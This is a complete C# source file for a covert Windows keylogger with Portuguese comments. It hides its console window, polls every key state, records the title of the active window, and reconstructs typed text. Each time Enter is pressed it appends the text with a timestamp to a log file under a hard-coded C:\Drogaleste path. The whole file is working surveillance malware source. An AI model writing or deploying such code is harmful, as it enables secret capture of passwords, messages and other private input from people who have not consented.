using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KeyboardHookHandle
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            bool[] previousKeyState = new bool[256];
            string log = "";
            bool capsLockOn = false;

            while (true)
            {
                bool shiftPressed = GetAsyncKeyState(16) != 0 || GetAsyncKeyState(160) != 0;

                IntPtr activeWindowHandle = GetForegroundWindow();
                string activeWindowTitle = GetActiveWindowTitle(activeWindowHandle);


                for (int i = 0; i < 256; i++)
                {
                    bool keyState = GetAsyncKeyState(i) != 0;
                    if (keyState == true && previousKeyState[i] == false)
                    {
                        if (i == 20) // Tecla Caps Lock
                        {
                            capsLockOn = !capsLockOn;
                        }
                        else
                        {
                            string key = MapKey(i, shiftPressed, capsLockOn);
                            if (!string.IsNullOrEmpty(key))
                            {
                                //Console.WriteLine($"Tecla pressionada: {key}");
                                //Console.WriteLine($"Janela ativa: {activeWindowTitle}");
                                log = UpdateLog(activeWindowTitle, log, key);

                            }
                        }
                    }
                    previousKeyState[i] = keyState;
                }

                Thread.Sleep(10);
            }
        }

        static string MapKey(int i, bool shiftPressed, bool capsLockOn)
        {
            if (i >= 48 && i <= 57 || i >= 96 && i <= 105) // Teclas numéricas e teclado numérico
            {
                return ((i % 48) % 10).ToString();
            }
            else if (i >= 65 && i <= 90) // Teclas de letras A-Z
            {
                char letter = (char)i;

                // Verifica se o Shift está pressionado ou se o Caps Lock está ligado (mas não ambos)
                if ((shiftPressed || capsLockOn) && !(shiftPressed && capsLockOn))
                {
                    return letter.ToString().ToUpper();
                }
                else
                {
                    return letter.ToString().ToLower();
                }
            }
            else
            {
                switch (i)
                {
                    case 1: case 2: return string.Empty;
                    case 8: return "[Backspace]";
                    case 9: return "[Tab]";
                    case 12: return "[Enter]";
                    case 13: return "[Enter]";
                    case 16: return "[Shift]";
                    case 160: return "[Shift]";
                    case 17: return "[Control]";
                    case 161: return "[Control]";
                    case 162: return "[Control]";
                    case 163: return "[Control]";
                    case 20: return "[CapsLock]";
                    case 27: return "[Escape]";
                    case 32: return "[Spacebar]";
                    case 37: return "[LeftArrow]";
                    case 38: return "[UpArrow]";
                    case 39: return "[RightArrow]";
                    case 40: return "[DownArrow]";
                    case 45: return "[Insert]";
                    case 46: return "[Delete]";
                    case 35: return "[End]";
                    case 36: return "[Home]";
                    case 33: return "[PageUp]";
                    case 34: return "[PageDown]";
                    case 106: return "*";
                    case 107: return "+";
                    case 109: return "-";
                    case 110: return ",";
                    case 111: return "/";
                    case 144: return "[NumLock]";
                    case 186: return "ç";
                    case 187: return "=";
                    case 188: return ",";
                    case 189: return "-";
                    case 190: return ".";
                    case 191: return "/";
                    case 192: return "'";
                    case 193: return "/?";
                    case 219: return "[";
                    case 220: return "\\";
                    case 221: return "]";
                    case 222: return "~";
                    case 226: return "\\";
                    default:
                        if (i >= 112 && i <= 123) // Teclas de função F1-F12?
                        {
                            return "[" + ((ConsoleKey)i).ToString() + "]";
                        }
                        else
                        {
                            return ((ConsoleKey)i).ToString();// + " --- " + i;
                        }
                }
            }
        }

        static string UpdateLog(string title, string log, string key)
        {
            if (key == "[Backspace]")
            {
                if (log.Length > 0)
                {
                    log = log.Substring(0, log.Length - 1);
                }
            }
            else if (key == "[Spacebar]")
            {
                log += " ";
            }
            else if (key == "[Enter]")
            {
                using (StreamWriter writer = new StreamWriter("C:\\Drogaleste\\Socket\\Modules\\KeyboardHook\\output.log", true))
                {
                    writer.WriteLine($"\r{DateTime.Now.ToString("HH:mm:ss")} | {title}\r\n {log}");
                }
                log = "";
            }
            else if (!key.StartsWith("["))
            {
                log += key;
            }

            return log;
        }

        static string GetActiveWindowTitle(IntPtr handle)
        {
            const int nChars = 256;
            StringBuilder title = new StringBuilder(nChars);
            if (GetWindowText(handle, title, nChars) > 0)
            {
                return title.ToString();
            }
            return "N/A";
        }
    }
}
